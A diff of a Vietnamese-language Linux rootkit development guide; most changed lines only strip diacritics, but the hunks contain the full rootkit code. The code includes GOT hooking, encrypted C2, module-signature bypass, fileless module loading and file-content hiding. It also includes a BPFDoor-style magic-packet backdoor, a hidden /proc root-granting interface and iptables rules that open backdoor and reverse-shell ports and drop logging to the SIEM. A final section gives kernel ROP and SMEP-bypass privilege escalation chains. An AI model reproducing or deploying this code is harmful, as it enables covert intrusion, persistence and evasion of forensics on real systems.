+ *   - RELRO (RELocation Read-Only) protection ngan write GOT
+ *   - Can ptrace hoac /proc/PID/mem access
  *
- * Used by: nhiều game cheats, Frida framework, LD_AUDIT.
+ * Used by: nhieu game cheats, Frida framework, LD_AUDIT.
  *
  * COMPILE: gcc -o got_hook got_plt_hook.c
  */
@@ -10202,38 +14425,38 @@ struct passwd *getpwent(void)
 #include <link.h>        /* dl_iterate_phdr, dl_phdr_info */
 #include <dlfcn.h>       /* dlsym */
 
-/* ── ELF structure walkthrough ──
+/* -- ELF structure walkthrough --
  *
  * ELF binary in memory:
  *
  *   Base address
- *   ├── ELF Header (Elf64_Ehdr)
- *   ├── Program Headers (Elf64_Phdr[])
- *   │   ├── PT_LOAD (code segment)
- *   │   ├── PT_LOAD (data segment)
- *   │   └── PT_DYNAMIC (dynamic linking info)  ← ta cần cái này
- *   ├── .text (code)
- *   ├── .plt  (PLT stubs)
- *   ├── .got.plt (GOT entries)  ← ta sửa ở đây
- *   └── ...
+ *   +-- ELF Header (Elf64_Ehdr)
+ *   +-- Program Headers (Elf64_Phdr[])
+ *   |   +-- PT_LOAD (code segment)
+ *   |   +-- PT_LOAD (data segment)
+ *   |   +-- PT_DYNAMIC (dynamic linking info)  <- ta can cai nay
+ *   +-- .text (code)
+ *   +-- .plt  (PLT stubs)
+ *   +-- .got.plt (GOT entries)  <- ta sua o day
+ *   +-- ...
  *
- * PT_DYNAMIC chứa array of Elf64_Dyn entries:
- *   DT_JMPREL → address of .rela.plt (relocation entries cho GOT)
- *   DT_PLTRELSZ → size of .rela.plt
- *   DT_SYMTAB → address of .dynsym (symbol table)
- *   DT_STRTAB → address of .dynstr (string table)
+ * PT_DYNAMIC chua array of Elf64_Dyn entries:
+ *   DT_JMPREL -> address of .rela.plt (relocation entries cho GOT)
+ *   DT_PLTRELSZ -> size of .rela.plt
+ *   DT_SYMTAB -> address of .dynsym (symbol table)
+ *   DT_STRTAB -> address of .dynstr (string table)
  *
- * Mỗi Elf64_Rela entry trong .rela.plt:
- *   r_offset = address of GOT entry (cần patch)
+ * Moi Elf64_Rela entry trong .rela.plt:
+ *   r_offset = address of GOT entry (can patch)
  *   r_info   = symbol index + relocation type
  *   r_addend = addend (usually 0 cho JUMP_SLOT)
  *
  * Flow:
- *   1. Parse PT_DYNAMIC → tìm DT_JMPREL, DT_SYMTAB, DT_STRTAB
+ *   1. Parse PT_DYNAMIC -> tim DT_JMPREL, DT_SYMTAB, DT_STRTAB
  *   2. Iterate .rela.plt entries
- *   3. Cho mỗi entry: lookup symbol name từ .dynsym + .dynstr
- *   4. So sánh tên → tìm target function
- *   5. r_offset = GOT entry address → overwrite với hook address
+ *   3. Cho moi entry: lookup symbol name tu .dynsym + .dynstr
+ *   4. So sanh ten -> tim target function
+ *   5. r_offset = GOT entry address -> overwrite voi hook address
  */
 
 struct got_hook {
@@ -10243,9 +14466,9 @@ struct got_hook {
     uint64_t   *got_entry;        /* Pointer to the GOT slot */
 };
 
-/* ── Find và patch GOT entry cho target function ──
+/* -- Find va patch GOT entry cho target function --
  *
- * dl_iterate_phdr callback: called cho mỗi loaded shared object.
+ * dl_iterate_phdr callback: called cho moi loaded shared object.
  * info->dlpi_addr = base address
  * info->dlpi_phdr = program header array
  * info->dlpi_phnum = number of program headers
@@ -10262,7 +14485,7 @@ static int find_got_callback(struct dl_phdr_info *info,
     size_t rela_count = 0;
     size_t i;
 
-    /* Tìm PT_DYNAMIC segment */
+    /* Tim PT_DYNAMIC segment */
     for (i = 0; i < info->dlpi_phnum; i++) {
         phdr = &info->dlpi_phdr[i];
         if (phdr->p_type == PT_DYNAMIC) {
@@ -10272,12 +14495,12 @@ static int find_got_callback(struct dl_phdr_info *info,
     }
     if (i == info->dlpi_phnum) return 0;
 
-    /* Parse DT_* entries từ PT_DYNAMIC */
+    /* Parse DT_* entries tu PT_DYNAMIC */
     for (; dyn->d_tag != DT_NULL; dyn++) {
         switch (dyn->d_tag) {
         case DT_JMPREL:
-            /* DT_JMPREL: pointer tới .rela.plt section.
-             * Chứa relocation entries cho mỗi PLT/GOT function. */
+            /* DT_JMPREL: pointer toi .rela.plt section.
+             * Chua relocation entries cho moi PLT/GOT function. */
             rela = (const Elf64_Rela *)dyn->d_un.d_ptr;
             break;
         case DT_PLTRELSZ:
@@ -10286,13 +14509,13 @@ static int find_got_callback(struct dl_phdr_info *info,
             rela_count = dyn->d_un.d_val / sizeof(Elf64_Rela);
             break;
         case DT_SYMTAB:
-            /* DT_SYMTAB: pointer tới .dynsym section.
-             * Chứa symbol entries (name index, value, size, type). */
+            /* DT_SYMTAB: pointer toi .dynsym section.
+             * Chua symbol entries (name index, value, size, type). */
             symtab = (const Elf64_Sym *)dyn->d_un.d_ptr;
             break;
         case DT_STRTAB:
-            /* DT_STRTAB: pointer tới .dynstr section.
-             * Chứa null-terminated strings cho symbol names. */
+            /* DT_STRTAB: pointer toi .dynstr section.
+             * Chua null-terminated strings cho symbol names. */
             strtab = (const char *)dyn->d_un.d_ptr;
             break;
         }
@@ -10301,9 +14524,9 @@ static int find_got_callback(struct dl_phdr_info *info,
     if (!rela || !symtab || !strtab || !rela_count)
         return 0;
 
-    /* Iterate .rela.plt → tìm target function's GOT entry */
+    /* Iterate .rela.plt -> tim target function's GOT entry */
     for (i = 0; i < rela_count; i++) {
-        /* Extract symbol index từ r_info.
+        /* Extract symbol index tu r_info.
          * ELF64_R_SYM(r_info) = high 32 bits = symbol table index.
          * ELF64_R_TYPE(r_info) = low 32 bits = relocation type. */
         uint32_t sym_idx = ELF64_R_SYM(rela[i].r_info);
@@ -10313,8 +14536,8 @@ static int find_got_callback(struct dl_phdr_info *info,
             continue;
 
         /* Found! r_offset = virtual address of GOT entry.
-         * Trên PIE binary: r_offset relative to load base.
-         * Trên non-PIE: r_offset là absolute address. */
+         * Tren PIE binary: r_offset relative to load base.
+         * Tren non-PIE: r_offset la absolute address. */
         uint64_t *got_slot = (uint64_t *)(info->dlpi_addr +
                                            rela[i].r_offset);
 
@@ -10323,9 +14546,9 @@ static int find_got_callback(struct dl_phdr_info *info,
         hook->got_entry = got_slot;
 
         /* Make GOT page writable.
-         * GOT nằm trong .got.plt section.
-         * Nếu FULL RELRO enabled: GOT mapped read-only SAU relocation.
-         * mprotect cho phép ghi tạm thời. */
+         * GOT nam trong .got.plt section.
+         * Neu FULL RELRO enabled: GOT mapped read-only SAU relocation.
+         * mprotect cho phep ghi tam thoi. */
         uintptr_t page = (uintptr_t)got_slot & ~0xFFF;
         if (mprotect((void *)page, 0x1000,
                      PROT_READ | PROT_WRITE) < 0) {
@@ -10333,10 +14556,10 @@ static int find_got_callback(struct dl_phdr_info *info,
             return 0;
         }
 
-        /* Overwrite GOT entry với hook function address */
+        /* Overwrite GOT entry voi hook function address */
         *got_slot = (uint64_t)hook->hook_fn;
 
-        /* Restore read-only (optional — tránh detection) */
+        /* Restore read-only (optional — tranh detection) */
         mprotect((void *)page, 0x1000, PROT_READ);
 
         return 1;  /* Stop iterating */
@@ -10345,7 +14568,7 @@ static int find_got_callback(struct dl_phdr_info *info,
     return 0;  /* Continue to next shared object */
 }
 
-/* ── Public API ── */
+/* -- Public API -- */
 int install_got_hook(struct got_hook *hook)
 {
     return dl_iterate_phdr(find_got_callback, hook);
@@ -10361,7 +14584,7 @@ void remove_got_hook(struct got_hook *hook)
     mprotect((void *)page, 0x1000, PROT_READ);
 }
 
-/* ── Example: Hook getuid() via GOT ── */
+/* -- Example: Hook getuid() via GOT -- */
 static uid_t fake_getuid(void)
 {
     return 0;  /* Always return root */
@@ -10387,7 +14610,7 @@ static uid_t fake_getuid(void)
 ```c
 /* encrypted_c2_chacha20.c — Kernel C2 encryption via ChaCha20-Poly1305
  *
- * Tại sao không dùng XOR:
+ * Tai sao khong dung XOR:
  *   - XOR cipher: trivially breakable (known-plaintext attack)
  *   - Nonce: 4-byte sequential, resets on reload = reuse
  *   - Key: hardcoded ASCII in .ko binary
@@ -10395,10 +14618,10 @@ static uid_t fake_getuid(void)
  *
  * ChaCha20-Poly1305 (AEAD: encryption + authentication):
  *   - ChaCha20: stream cipher, nhanh trong software
- *   - Poly1305: MAC, đảm bảo integrity
- *   - Kernel crypto API hỗ trợ sẵn: rfc7539(chacha20,poly1305)
+ *   - Poly1305: MAC, dam bao integrity
+ *   - Kernel crypto API ho tro san: rfc7539(chacha20,poly1305)
  *   - 12-byte nonce (96-bit), atomic counter — no reuse
- *   - Key: derive từ master secret via HKDF
+ *   - Key: derive tu master secret via HKDF
  */
 
 #include "rootkit.h"
@@ -10413,8 +14636,8 @@ static u8 c2_session_key[C2_KEY_SIZE];
 static struct crypto_aead *c2_aead_tfm;
 
 /* Atomic nonce counter — prevents nonce reuse under concurrent access.
- * Mỗi message dùng nonce khác nhau, atomic_inc_return đảm bảo
- * không có 2 thread nào nhận cùng nonce value. */
+ * Moi message dung nonce khac nhau, atomic_inc_return dam bao
+ * khong co 2 thread nao nhan cung nonce value. */
 static atomic_t nonce_counter = ATOMIC_INIT(0);
 
 int rk_crypto_init(void)
@@ -10476,7 +14699,7 @@ int rk_aead_encrypt(const void *plaintext, int pt_len,
     ct_buf = kzalloc(ct_len, GFP_KERNEL);
     if (!ct_buf) return -ENOMEM;
 
-    /* Copy plaintext vào output buffer (in-place encrypt) */
+    /* Copy plaintext vao output buffer (in-place encrypt) */
     memcpy(ct_buf, plaintext, pt_len);
 
     sg_init_one(&sg_plain, ct_buf, ct_len);
@@ -10563,13 +14786,13 @@ int rk_aead_decrypt(const void *input, int in_len,
 ```c
 /* mod_sig_bypass.c — Bypass CONFIG_MODULE_SIG_FORCE
  *
- * Kernel với CONFIG_MODULE_SIG_FORCE=y reject unsigned modules.
- * Phải bypass để load rootkit.
+ * Kernel voi CONFIG_MODULE_SIG_FORCE=y reject unsigned modules.
+ * Phai bypass de load rootkit.
  *
  * Methods:
- *   1. Disable sig_enforce tại runtime
+ *   1. Disable sig_enforce tai runtime
  *   2. Load via init_module syscall (bypass modprobe checks)
- *   3. Steal signing key từ kernel build environment
+ *   3. Steal signing key tu kernel build environment
  */
 
 #include "rootkit.h"
@@ -10577,11 +14800,11 @@ int rk_aead_decrypt(const void *input, int in_len,
 /* Method 1: Disable module signature enforcement.
  *
  * sig_enforce = global bool trong kernel.
- * Setting = false → mọi module load mà không check signature.
- * Cần EXISTING kernel code execution (exploit hoặc another module).
+ * Setting = false -> moi module load ma khong check signature.
+ * Can EXISTING kernel code execution (exploit hoac another module).
  *
  * sig_enforce may reside in .rodata (read-only data section).
- * Writing without unprotecting memory → page fault → kernel oops.
+ * Writing without unprotecting memory -> page fault -> kernel oops.
  * Must call rk_unprotect_memory() to clear WP bit in CR0 first.
  */
 static void rk_disable_sig_enforce(void)
@@ -10597,18 +14820,18 @@ static void rk_disable_sig_enforce(void)
     }
 
     /* Alternative: modify module_sig_check function.
-     * Hook nó để always return 0 (success). */
+     * Hook no de always return 0 (success). */
 }
 
 /* Method 2: Load module programmatically.
  *
- * init_module/finit_module syscall load .ko trực tiếp.
- * Bypass modprobe (modprobe thêm checks).
+ * init_module/finit_module syscall load .ko truc tiep.
+ * Bypass modprobe (modprobe them checks).
  *
- * Từ userspace:
+ * Tu userspace:
  *   int fd = open("rootkit.ko", O_RDONLY);
  *   finit_module(fd, "", 0);
- * Hoặc:
+ * Hoac:
  *   void *image = mmap(ko_file);
  *   init_module(image, size, "");
  */
@@ -10619,16 +14842,16 @@ static void rk_disable_sig_enforce(void)
 ### I.3 Fileless Rootkit — Load from memory {#fileless-rootkit}
 
 ```c
-/* fileless.c — Load kernel module từ memory (không .ko trên disk)
+/* fileless.c — Load kernel module tu memory (khong .ko tren disk)
  *
- * Normal: insmod rootkit.ko → .ko file tồn tại trên disk
- *         → forensics find .ko → game over.
+ * Normal: insmod rootkit.ko -> .ko file ton tai tren disk
+ *         -> forensics find .ko -> game over.
  *
- * Fileless: module loaded trực tiếp từ memory.
- * .ko file KHÔNG BAO GIỜ chạm disk.
+ * Fileless: module loaded truc tiep tu memory.
+ * .ko file KHONG BAO GIO cham disk.
  *
- * Method: init_module() syscall nhận module image từ memory.
- * Loader đọc .ko từ network/embedded → gọi init_module().
+ * Method: init_module() syscall nhan module image tu memory.
+ * Loader doc .ko tu network/embedded -> goi init_module().
  */
 
 /* Userspace loader — fileless_loader.c
@@ -10651,29 +14874,29 @@ static int load_module_from_memory(void *image, unsigned long len)
      * len: size of module image
      * param_values: module parameters string (empty = "")
      *
-     * Kernel sẽ:
+     * Kernel se:
      *   1. Parse ELF headers
      *   2. Allocate module memory
-     *   3. Copy sections từ image vào allocated memory
+     *   3. Copy sections tu image vao allocated memory
      *   4. Resolve symbols, apply relocations
-     *   5. Gọi module_init function
+     *   5. Goi module_init function
      *
-     * Image KHÔNG cần tồn tại trên disk — chỉ cần trong memory. */
+     * Image KHONG can ton tai tren disk — chi can trong memory. */
     return syscall(__NR_init_module, image, len, "");
 }
 
-/* finit_module: load từ fd (có thể memfd_create — fd ẩn) */
+/* finit_module: load tu fd (co the memfd_create — fd an) */
 static int load_module_from_memfd(void *image, unsigned long len)
 {
-    /* memfd_create: tạo anonymous file TRONG MEMORY.
-     * Không visible trong filesystem.
-     * Tuy nhiên visible trong /proc/PID/fd/ → ẩn via rootkit. */
+    /* memfd_create: tao anonymous file TRONG MEMORY.
+     * Khong visible trong filesystem.
+     * Tuy nhien visible trong /proc/PID/fd/ -> an via rootkit. */
     int fd = syscall(__NR_memfd_create, "", 1 /* MFD_CLOEXEC */);
     if (fd < 0) return -1;
 
     write(fd, image, len);
 
-    /* finit_module: load module từ file descriptor */
+    /* finit_module: load module tu file descriptor */
     int ret = syscall(__NR_finit_module, fd, "", 0);
     close(fd);
     return ret;
@@ -10681,13 +14904,13 @@ static int load_module_from_memfd(void *image, unsigned long len)
 
 /* Full flow:
  *   1. Attacker sends .ko bytes qua encrypted channel
- *   2. Loader receives vào memory buffer
- *   3. Gọi load_module_from_memory(buffer, size)
- *   4. Module loaded → rootkit active
- *   5. Loader overwrites buffer → free → exit
+ *   2. Loader receives vao memory buffer
+ *   3. Goi load_module_from_memory(buffer, size)
+ *   4. Module loaded -> rootkit active
+ *   5. Loader overwrites buffer -> free -> exit
  *   6. .ko file NEVER touched disk
  *
- * Combine với: loader tự xóa (unlink argv[0])
+ * Combine voi: loader tu xoa (unlink argv[0])
  *              loader qua memfd_create
  *              loader embedded trong exploit payload
  */
@@ -10698,22 +14921,22 @@ static int load_module_from_memfd(void *image, unsigned long len)
 ### I.4 File Content Hiding — Reptile-style {#file-content-hide}
 
 ```c
-/* file_content_hide.c — Hide/modify file contents khi đọc
+/* file_content_hide.c — Hide/modify file contents khi doc
  *
- * Reptile rootkit hook read() để modify file CONTENT.
- * Khác getdents filtering (ẩn filename) — đây ẩn NỘI DUNG.
+ * Reptile rootkit hook read() de modify file CONTENT.
+ * Khac getdents filtering (an filename) — day an NOI DUNG.
  *
  * Use cases:
- *   - /etc/ld.so.preload: ẩn rootkit entry
- *   - /etc/crontab: ẩn persistence entries
- *   - /proc/net/tcp: ẩn connections (already covered)
- *   - Config files: ẩn backdoor configs
+ *   - /etc/ld.so.preload: an rootkit entry
+ *   - /etc/crontab: an persistence entries
+ *   - /proc/net/tcp: an connections (already covered)
+ *   - Config files: an backdoor configs
  */
 
 #include "rootkit.h"
 
-/* Tích hợp vào hooked_read() (Chapter 3).
- * Thêm check cho từng target file. */
+/* Tich hop vao hooked_read() (Chapter 3).
+ * Them check cho tung target file. */
 static long filter_file_content(int fd, char __user *user_buf,
                                   long orig_ret,
                                   const char *target_path,
@@ -10734,7 +14957,7 @@ static long filter_file_content(int fd, char __user *user_buf,
     }
     kern_buf[orig_ret] = '\0';
 
-    /* Remove lines chứa hide_string */
+    /* Remove lines chua hide_string */
     src = kern_buf;
     dst = kern_buf;
     new_ret = 0;
@@ -10758,7 +14981,7 @@ static long filter_file_content(int fd, char __user *user_buf,
     return new_ret;
 }
 
-/* Sử dụng trong hooked_read:
+/* Su dung trong hooked_read:
  *
  * long ret = orig_read(regs);
  * ret = filter_file_content(fd, buf, ret,
@@ -10777,10 +15000,10 @@ static long filter_file_content(int fd, char __user *user_buf,
 /* port_forward.c — Kernel-level TCP port forwarding
  *
  * Drovorub provides transparent port forwarding:
- *   Attacker → rootkit port X → forward tới internal host:port Y.
+ *   Attacker -> rootkit port X -> forward toi internal host:port Y.
  *   Rootkit acts as proxy, completely invisible.
  *
- * Use case: attacker trên external network reach internal services
+ * Use case: attacker tren external network reach internal services
  * through compromised host.
  */
 
@@ -10796,7 +15019,7 @@ struct forward_rule {
 
 #define RELAY_BUF_SIZE 4096
 
-/* Relay data giữa 2 sockets (bidirectional pipe) */
+/* Relay data giua 2 sockets (bidirectional pipe) */
 static int relay_data(struct socket *src, struct socket *dst)
 {
     char *buf;
@@ -10849,7 +15072,7 @@ static int forward_thread_fn(void *data)
         ret = kernel_accept(listen_sock, &client_sock, 0);
         if (ret < 0) { msleep(100); continue; }
 
-        /* Connect tới target */
+        /* Connect toi target */
         ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                                 IPPROTO_TCP, &target_sock);
         if (ret < 0) { sock_release(client_sock); continue; }
@@ -10894,16 +15117,16 @@ out:
 ```c
 /* classic_bpf.c — Stealth packet monitoring via classic BPF
  *
- * BPFDoor dùng classic BPF (KHÔNG phải eBPF) vì:
- *   - Chạy hoàn toàn trong userspace
- *   - Attach vào raw socket → nhận copy of packets
- *   - KHÔNG cần kernel module
- *   - Invisible cho netfilter (netfilter hooks TRƯỚC BPF socket filters)
- *   - Không xuất hiện trong iptables, nftables, ss
+ * BPFDoor dung classic BPF (KHONG phai eBPF) vi:
+ *   - Chay hoan toan trong userspace
+ *   - Attach vao raw socket -> nhan copy of packets
+ *   - KHONG can kernel module
+ *   - Invisible cho netfilter (netfilter hooks TRUOC BPF socket filters)
+ *   - Khong xuat hien trong iptables, nftables, ss
  *
- * Classic BPF filter: compile filter rules thành bytecode,
- * kernel evaluate bytecode cho mỗi incoming packet,
- * matching packets delivered tới raw socket.
+ * Classic BPF filter: compile filter rules thanh bytecode,
+ * kernel evaluate bytecode cho moi incoming packet,
+ * matching packets delivered toi raw socket.
  *
  * Compile: gcc -o bpf_listener classic_bpf.c
  */
@@ -10927,19 +15150,19 @@ int main(void)
     unsigned char buf[65535];
     ssize_t len;
 
-    /* ── BPF filter: ICMP packets with magic bytes in payload ──
+    /* -- BPF filter: ICMP packets with magic bytes in payload --
      *
      * Classic BPF bytecode: array of struct sock_filter instructions.
-     * Mỗi instruction: { code, jt, jf, k }
+     * Moi instruction: { code, jt, jf, k }
      *   code = opcode
      *   jt   = jump offset if TRUE
      *   jf   = jump offset if FALSE
      *   k    = constant value
      *
      * Filter logic:
-     *   1. Load EtherType field → check == 0x0800 (IPv4)
-     *   2. Load IP protocol field → check == 1 (ICMP)
-     *   3. Load ICMP payload byte → check == magic
+     *   1. Load EtherType field -> check == 0x0800 (IPv4)
+     *   2. Load IP protocol field -> check == 1 (ICMP)
+     *   3. Load ICMP payload byte -> check == magic
      *   4. If match: accept. Else: reject.
      */
     struct sock_filter bpf_code[] = {
@@ -10984,12 +15207,12 @@ int main(void)
     /* Detach from terminal, disguise process name */
     daemon(0, 0);
 
-    /* ── Packet receive loop ── */
+    /* -- Packet receive loop -- */
     while (1) {
         len = recv(sock, buf, sizeof(buf), 0);
         if (len <= 0) continue;
 
-        /* Parse: eth + ip + icmp headers → extract payload */
+        /* Parse: eth + ip + icmp headers -> extract payload */
         struct iphdr *ip = (struct iphdr *)(buf + 14);
         struct icmphdr *icmp = (struct icmphdr *)((char *)ip + ip->ihl * 4);
         char *payload = (char *)(icmp + 1);
@@ -11024,17 +15247,17 @@ int main(void)
 ### I.7 /proc Fake Entries — Hidden control interface {#proc-fake}
 
 ```c
-/* proc_interface.c — Tạo hidden /proc entry cho rootkit control
+/* proc_interface.c — Tao hidden /proc entry cho rootkit control
  *
- * Thay vì dùng magic signal (kill), tạo /proc entry
- * cho phép read/write config:
- *   echo "hide 1234" > /proc/.rk_ctl   → hide PID 1234
- *   echo "unhide 1234" > /proc/.rk_ctl → show PID 1234
- *   echo "root" > /proc/.rk_ctl        → give root
- *   cat /proc/.rk_ctl                   → show status
+ * Thay vi dung magic signal (kill), tao /proc entry
+ * cho phep read/write config:
+ *   echo "hide 1234" > /proc/.rk_ctl   -> hide PID 1234
+ *   echo "unhide 1234" > /proc/.rk_ctl -> show PID 1234
+ *   echo "root" > /proc/.rk_ctl        -> give root
+ *   cat /proc/.rk_ctl                   -> show status
  *
- * Entry ẩn: bắt đầu bằng "." → ls /proc không thấy.
- * Kết hợp getdents64 hook → completely invisible.
+ * Entry an: bat dau bang "." -> ls /proc khong thay.
+ * Ket hop getdents64 hook -> completely invisible.
  */
 
 #include "rootkit.h"
@@ -11121,8 +15344,8 @@ static const struct proc_ops rk_proc_ops = {
 
 int rk_proc_init(void)
 {
-    /* Tên bắt đầu "." → hidden từ ls /proc (nhưng vẫn accessible).
-     * Kết hợp getdents64 hook filter ".rk" prefix → invisible. */
+    /* Ten bat dau "." -> hidden tu ls /proc (nhung van accessible).
+     * Ket hop getdents64 hook filter ".rk" prefix -> invisible. */
     rk_proc_entry = proc_create(".rk_ctl", 0600, NULL, &rk_proc_ops);
     return rk_proc_entry ? 0 : -ENOMEM;
 }
@@ -11136,15 +15359,15 @@ void rk_proc_cleanup(void)
 
 ---
 
-### I.8 iptables Rule Injection từ kernel {#iptables-inject}
+### I.8 iptables Rule Injection tu kernel {#iptables-inject}
 
 ```c
-/* iptables_inject.c — Inject firewall rules từ kernel space
+/* iptables_inject.c — Inject firewall rules tu kernel space
  *
- * Programmatically add iptables rules để:
- *   - Mở port backdoor
+ * Programmatically add iptables rules de:
+ *   - Mo port backdoor
  *   - Forward traffic
- *   - Drop forensics traffic (tới SIEM, log server)
+ *   - Drop forensics traffic (toi SIEM, log server)
  *   - Redirect DNS (cho DNS hijacking)
  */
 
@@ -11154,19 +15377,19 @@ void rk_proc_cleanup(void)
 static void rk_inject_iptables(void)
 {
     char *cmd =
-        /* Allow inbound trên backdoor port */
+        /* Allow inbound tren backdoor port */
         "iptables -I INPUT -p tcp --dport 31337 -j ACCEPT 2>/dev/null; "
         /* Allow outbound cho reverse shell */
         "iptables -I OUTPUT -p tcp --dport 4444 -j ACCEPT 2>/dev/null; "
-        /* Port forward: external:8080 → internal:22 (SSH pivot) */
+        /* Port forward: external:8080 -> internal:22 (SSH pivot) */
         "iptables -t nat -A PREROUTING -p tcp --dport 8080 "
         "-j DNAT --to-destination 10.0.0.5:22 2>/dev/null; "
         "iptables -t nat -A POSTROUTING -j MASQUERADE 2>/dev/null; "
         "echo 1 > /proc/sys/net/ipv4/ip_forward; "
-        /* Drop syslog traffic (prevent log forwarding tới SIEM) */
+        /* Drop syslog traffic (prevent log forwarding toi SIEM) */
         "iptables -I OUTPUT -p udp --dport 514 -j DROP 2>/dev/null; "
-        /* Ẩn rules: iptables-save sẽ thấy nhưng rootkit có thể
-         * hook read() trên stdout của iptables-save process */
+        /* An rules: iptables-save se thay nhung rootkit co the
+         * hook read() tren stdout cua iptables-save process */
         "true";
 
     char *argv[] = { "/bin/sh", "-c", cmd, NULL };
@@ -11196,45 +15419,66 @@ static void rk_remove_iptables(void)
 
 ### J.1 Kernel ROP / ret2usr / SMEP Bypass {#kernel-rop}
 
+**Deep Kernel Internals: Kernel Exploitation Flow va Hardware Protections**
+
+Khi chua co kernel code execution (chua load duoc module), phai exploit kernel vulnerability truoc. Flow chuan cua kernel privilege escalation exploit:
+
+```
+1. Tim vulnerability (buffer overflow, use-after-free, type confusion, etc.)
+2. Dat duoc controlled write hoac code execution primitive
+3. Build ROP chain tren controlled memory (stack hoac heap):
+   a. pop rdi; ret           -> load NULL vao RDI (arg1 cho prepare_kernel_cred)
+   b. prepare_kernel_cred(0) -> tra ve root cred pointer trong RAX
+   c. mov rdi, rax; ret      -> chuyen cred pointer sang arg1
+   d. commit_creds(cred)     -> ap dung root credentials cho current task
+   e. swapgs; iretq          -> quay ve userspace voi quyen root
+4. Trigger vulnerability de redirect execution toi ROP chain
+```
+
+Hardware protections can vuot qua:
+- **SMEP** (Supervisor Mode Execution Prevention): CR4 bit 20. Kernel KHONG THE execute code tren userspace pages. Ngan ky thuat ret2usr co dien.
+- **SMAP** (Supervisor Mode Access Prevention): CR4 bit 21. Kernel KHONG THE doc/ghi userspace pages. Ngan viec dung user-controlled data lam ROP chain.
+- Bypass: ROP gadget `mov cr4, rdi; ret` de clear SMEP/SMAP bits. Tuy nhien kernel 5.x+ implement CR4 pinning — kernel kiem tra va restore CR4 tai moi context switch, lam cho bypass nay kho thanh cong hon.
+
 ```c
 /* kernel_exploit_primitives.c — Kernel exploitation techniques
  *
  * MISSING coverage: Kernel ROP, ret2usr, SMEP/SMAP bypass.
- * Đây là các techniques dùng khi CHƯA CÓ kernel code execution
- * (chưa load được module) — cần exploit vulnerability trước.
+ * Day la cac techniques dung khi CHUA CO kernel code execution
+ * (chua load duoc module) — can exploit vulnerability truoc.
  *
- * Context: rootkit cần load module, nhưng nếu không có root access,
- * phải exploit kernel vulnerability trước.
+ * Context: rootkit can load module, nhung neu khong co root access,
+ * phai exploit kernel vulnerability truoc.
  *
- * NOTE: Đây là educational reference, không phải working exploits.
- * Mỗi vulnerability khác nhau cần gadgets khác nhau.
+ * NOTE: Day la educational reference, khong phai working exploits.
+ * Moi vulnerability khac nhau can gadgets khac nhau.
  */
 
 /* ═══════════════════════════════════════════════════
  * 1. ret2usr (Return to Userspace)
  *
- * Kỹ thuật cũ nhất: redirect kernel execution tới userspace code.
- * Bị chặn bởi SMEP (Supervisor Mode Execution Prevention, CR4 bit 20)
- * và SMAP (Supervisor Mode Access Prevention, CR4 bit 21).
+ * Ky thuat cu nhat: redirect kernel execution toi userspace code.
+ * Bi chan boi SMEP (Supervisor Mode Execution Prevention, CR4 bit 20)
+ * va SMAP (Supervisor Mode Access Prevention, CR4 bit 21).
  *
  * Pre-SMEP flow (kernel < 3.0):
- *   1. Allocate userspace page chứa payload
+ *   1. Allocate userspace page chua payload
  *   2. Overflow/corrupt function pointer trong kernel
- *   3. Kernel jumps tới userspace payload
- *   4. Payload chạy trong ring 0 context
+ *   3. Kernel jumps toi userspace payload
+ *   4. Payload chay trong ring 0 context
  *
- * SMEP bypass: clear CR4 bit 20 trước khi ret2usr
+ * SMEP bypass: clear CR4 bit 20 truoc khi ret2usr
  * ═══════════════════════════════════════════════════ */
 
-/* Userspace payload — chạy trong ring 0 khi kernel calls nó */
+/* Userspace payload — chay trong ring 0 khi kernel calls no */
 void __attribute__((used)) userspace_payload(void)
 {
-    /* Đang trong kernel context (ring 0) dù code ở userspace.
-     * Gọi commit_creds(prepare_kernel_cred(NULL)) cho root.
+    /* Dang trong kernel context (ring 0) du code o userspace.
+     * Goi commit_creds(prepare_kernel_cred(NULL)) cho root.
      *
-     * Phải resolve addresses runtime (KASLR).
-     * commit_creds_ptr và prepare_kernel_cred_ptr
-     * resolved từ /proc/kallsyms hoặc info leak. */
+     * Phai resolve addresses runtime (KASLR).
+     * commit_creds_ptr va prepare_kernel_cred_ptr
+     * resolved tu /proc/kallsyms hoac info leak. */
 
     typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *);
     typedef int (*commit_creds_t)(struct cred *);
@@ -11251,21 +15495,21 @@ void __attribute__((used)) userspace_payload(void)
  * 2. ROP (Return-Oriented Programming)
  *
  * Kernel ROP: chain gadgets trong kernel text (.text section).
- * Mỗi gadget = snippet kết thúc bằng RET.
- * Chain gadgets trên stack → arbitrary code execution.
+ * Moi gadget = snippet ket thuc bang RET.
+ * Chain gadgets tren stack -> arbitrary code execution.
  *
- * Common gadgets (tìm bằng ROPgadget hoặc ropr):
- *   pop rdi; ret     → load arg1
- *   pop rsi; ret     → load arg2
- *   mov cr4, rdi; ret → disable SMEP
- *   xchg eax, esp; ret → stack pivot
+ * Common gadgets (tim bang ROPgadget hoac ropr):
+ *   pop rdi; ret     -> load arg1
+ *   pop rsi; ret     -> load arg2
+ *   mov cr4, rdi; ret -> disable SMEP
+ *   xchg eax, esp; ret -> stack pivot
  *
  * Typical ROP chain for privilege escalation:
- *   1. pop rdi; ret → NULL
- *   2. prepare_kernel_cred → returns new cred in RAX
- *   3. mov rdi, rax; ret → move cred to arg1
- *   4. commit_creds → apply root cred
- *   5. swapgs; iretq → return to userspace
+ *   1. pop rdi; ret -> NULL
+ *   2. prepare_kernel_cred -> returns new cred in RAX
+ *   3. mov rdi, rax; ret -> move cred to arg1
+ *   4. commit_creds -> apply root cred
+ *   5. swapgs; iretq -> return to userspace
  * ═══════════════════════════════════════════════════ */
 
 struct rop_chain {
@@ -11325,7 +15569,7 @@ static void build_privesc_chain(struct rop_chain *rop,
  * Set rdi = CR4 value with bits 20+21 cleared.
  *
  * Modern bypass (post-5.x): CR4 pinning makes this harder.
- * Kernel checks CR4 on context switch → re-enables SMEP/SMAP.
+ * Kernel checks CR4 on context switch -> re-enables SMEP/SMAP.
  * Must complete exploit before next context switch.
  * ═══════════════════════════════════════════════════ */
 
@@ -11347,27 +15591,27 @@ static void add_smep_bypass(struct rop_chain *rop,
 /* ═══════════════════════════════════════════════════
  * 4. Stack Pivot
  *
- * Khi overflow chỉ control limited bytes trên stack,
- * cần "pivot" RSP tới attacker-controlled buffer
- * chứa full ROP chain.
+ * Khi overflow chi control limited bytes tren stack,
+ * can "pivot" RSP toi attacker-controlled buffer
+ * chua full ROP chain.
  *
  * Common gadget: xchg eax, esp; ret
  *   Swap lower 32 bits of RAX with ESP.
- *   RAX set via earlier gadget tới mmap'd address.
